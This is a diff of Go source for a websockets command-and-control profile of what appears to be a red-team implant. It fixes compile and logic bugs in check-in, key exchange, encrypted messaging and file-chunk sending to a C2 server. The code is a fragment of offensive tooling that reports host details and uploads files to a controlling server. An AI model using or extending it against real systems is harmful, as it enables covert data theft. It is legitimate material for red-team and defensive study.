@@ -135,7 +135,7 @@ func (c *C2Websockets) SetRsaKey(newKey *rsa.PrivateKey) {
 	c.RsaPrivateKey = newKey
 }
 
-func (c C2Default) ProfileType() string {
+func (c C2Websockets) ProfileType() string {
 	t := reflect.TypeOf(c)
 	return t.Name()
 }
@@ -168,7 +168,7 @@ func (c *C2Websockets) PostResponse(task structs.Task, output string) []byte {
 	responseMsg.Responses = make([]json.RawMessage, 1)
 	responseMsg.Responses[0] = []byte(output)
 
-	dataToSend, _ := json.Marshal(responseMsg)
+	dataToSend, err := json.Marshal(responseMsg)
 	if err != nil {
 		log.Printf("Error marshaling data for postRESTResponse: %s", err.Error())
 		return make([]byte, 0)
@@ -288,7 +288,7 @@ func (c *C2Websockets) SendFileChunks(task structs.Task, fileData []byte) {
 	resp := c.PostResponse(task, string(msg))
 	fileResp := structs.TaskResponseMessageResponse{}
 
-	err := json.Unmarshal(resp, &fileResp)
+	err = json.Unmarshal(resp, &fileResp)
 
 	if err != nil {
 		log.Printf("Error unmarshaling: %s", err.Error())
@@ -361,7 +361,7 @@ func (c *C2Websockets) CheckIn(ip string, pid int, user string, host string) int
 	// Establish a connection to the websockets server
 	url := fmt.Sprintf("%s%s", c.URL(), websocketEndpoint)
 	header := make(http.Header)
-	header.Set("User-Agent", UserAgent)
+	header.Set("User-Agent", PConfig.UserAgent)
 
 	if len(c.Header()) != 0 {
 		header.Set("Host", c.Header())
@@ -370,7 +370,7 @@ func (c *C2Websockets) CheckIn(ip string, pid int, user string, host string) int
 	connection, _, err := websocket.DefaultDialer.Dial(url, header)
 
 	if err != nil {
-		//log.Printf("Error connecting to server %s ", err.Error())
+		log.Printf("Error connecting to server %s ", err.Error())
 		return structs.CheckInMessageResponse{Action: "checkin", Status: "failed"}
 	}
 
@@ -431,6 +431,7 @@ func (c *C2Websockets) NegotiateKey() string {
 		return ""
 	}
 
+	//log.Printf("Sending EKE msg: %+v\n", initMessage)
 	resp := c.sendData("", raw)
 
 	decryptedResponse := crypto.RsaDecryptCipherBytes(resp, c.RsaKey())
@@ -442,6 +443,7 @@ func (c *C2Websockets) NegotiateKey() string {
 		return ""
 	}
 
+	//log.Printf("Received EKE response: %+v\n", sessionKeyResp)
 	// Save the new AES session key
 	c.AesPSK = sessionKeyResp.SessionKey
 	c.ExchangingKeys = false
@@ -458,7 +460,7 @@ func (c *C2Websockets) sendData(tag string, sendData []byte) []byte {
 	m := structs.Message{}
 
 	if len(c.AesPSK) != 0 {
-		sendData = string(EncryptMessage(sendData, c.AesPreSharedKey()))
+		sendData = EncryptMessage(sendData, c.AesPreSharedKey())
 	}
 
 	sendData = append([]byte(c.ApfellID), sendData...)
@@ -479,7 +481,7 @@ func (c *C2Websockets) sendData(tag string, sendData []byte) []byte {
 		return make([]byte, 0)
 	}
 
-	raw, err := base64.StdEncoding.DecodeString(m.Data)
+	raw, err := base64.StdEncoding.DecodeString(resp.Data)
 	if err != nil {
 		log.Println("Error decoding base64 data: ", err.Error())
 		return make([]byte, 0)
